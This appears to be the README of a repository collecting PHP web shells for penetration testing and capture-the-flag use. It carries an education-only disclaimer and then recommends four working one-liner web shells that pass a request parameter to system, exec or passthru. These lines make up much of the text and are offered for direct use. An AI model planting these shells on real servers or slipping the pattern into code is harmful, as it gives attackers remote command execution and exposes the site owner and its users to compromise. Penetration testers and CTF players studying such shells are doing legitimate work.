# Common-PHP-web-shells
Common PHP shells is a collection of PHP webshells that you may need for your penetration testing (PT) cases or in a CTF challenge.

Do not host any of the files on a publicly-accessible webserver (unless you know what you are up-to).

These are provided for education purposes only and legitimate PT cases.

I'll keep updating the collection whnever I stumble on any new webshell.

# FYI
For basic features, I recommend one-liners like :

<?php echo passthru($_GET['cmd']); ?>

<?php echo exec($_POST['cmd']); ?>

<?php system($_GET['cmd']); ?>

<?php passthru($_REQUEST['cmd']); ?>
